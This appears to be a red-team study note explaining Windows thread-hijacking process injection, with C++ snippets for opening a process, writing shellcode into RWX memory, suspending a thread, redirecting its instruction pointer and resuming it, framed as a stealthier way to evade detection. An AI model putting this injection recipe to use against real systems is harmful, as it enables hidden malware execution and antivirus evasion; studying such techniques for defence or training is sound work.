---
{"dg-publish":true,"permalink":"/cards/red-team/images/abusing-process-components/","tags":["red-team/host-evasion"]}
---

~ [[cards/red-team/Abusing Windows Internals\|Abusing Windows Internals]]
### Introduction
---
Thread hijacking is a technique used by attackers to inject code (shellcode) into an existing **thread** of a legitimate process, then **redirect** that thread to execute their **malicious code** instead.

It is much stealthier than creating a new thread such as `CreateRemoteThread` because you'r hijacking an existing thread, making it harder to detect.

A _thread_ is like a **worker** inside a program (restuarant) that performs a specific task in order to ensure the program (restaurant) runs smoothly.
## Steps
---
**Step 1: Open the Target Process**

```cpp
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
```

- Locate the **target** process by it's PID.
- Use `OpenProcess` to get a handle to the process with **full access** (`PROCESS_ALL_ACCESS`) so we can write to it and manipulate its memory/threads.

**Step 2: Allocate Memory in the Target Process**

```cpp
PVOID remoteBuffer = VirtualAllocEx(
    hProcess,
    NULL,
    sizeof shellcode,
    MEM_RESERVE | MEM_COMMIT,
    PAGE_EXECUTE_READWRITE
);
```

- Reserves and commits memory within the **remote process**.

- The allocated memory will store the **malicious shellcode**, hence we use `sizeof shellcode`.

- `PAGE_EXECUTE_READWRITE` allows the code to be executed, read, and written.

**Step 3: Write Shellcode to Allocated Memory**

```cpp
WriteProcessMemory(
    hProcess,
    remoteBuffer,
    shellcode,
    sizeof shellcode,
    NULL
);
```

Inject the **shellcode** (malicious payload) into the **allocated memory** inside the target process.

**Step 4: Take a Snapshot of All Threads**

```cpp
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
```

- Takes a **snapshot of all threads** running on the system.
    
- Needed to identify which thread **belongs** to the target process.

**Step 5: Find a Thread from the Target Process**

```cpp
THREADENTRY32 threadEntry;
Thread32First(hSnapshot, &threadEntry);

while (Thread32Next(hSnapshot, &threadEntry)) {
    if (threadEntry.th32OwnerProcessID == processId) {
        // Found thread belonging to our target process 
        // The code inside this if condition is at step 6
    }
}
```

Loops through all threads and checks if any of them belong to the target process (`th32OwnerProcessID` == target PID).

**Step 6: Open the Target Thread**

```cpp
HANDLE hThread = OpenThread(
    THREAD_ALL_ACCESS,
    FALSE,
    threadEntry.th32ThreadID
);
```

- Opens the **target thread** found in the previous step.

- Grants **full control** over the thread (read, write, suspend, etc.).

**Step 7: Suspend the Target Thread**

```cpp
SuspendThread(hThread);
```

Freezes the thread so we can **safely manipulate** its execution context.

**Step 8: Get the Thread's Context**

```cpp
CONTEXT context;
context.ContextFlags = CONTEXT_FULL;

GetThreadContext(hThread, &context);
```

- Retrieves the **execution context** of the thread.
    
- This includes register values like the **instruction pointer (RIP)**.

**Step 9: Set RIP to Our Shellcode**

```cpp
context.Rip = (DWORD_PTR)remoteBuffer;
```

- **Modifies the Instruction Pointer (RIP)** to point to our **malicious shellcode**.
    
- RIP determines the next instruction the CPU will execute.

**Step 10: Apply the Modified Context**

```cpp
SetThreadContext(hThread, &context);
```

- **Writes back** the modified thread context.
    
- The thread will now execute the shellcode once resumed.

**Step : Resume Thread**

```cpp
ResumeThread(hThread);
```

- Resumes the previously suspended thread.
    
- Execution jumps to our shellcode in the remote process.

### Prerequisite in order to work
---
- **High privileges** especially `PROCESS_ALL_ACCESS` and `THREAD_ALL_ACCESS`
- Target process must allow memory allocation and thread manipulation (i.e., not protected by kernel drivers like anti-virus)
- Architecture match: injector must match target process — both x86 or both x64
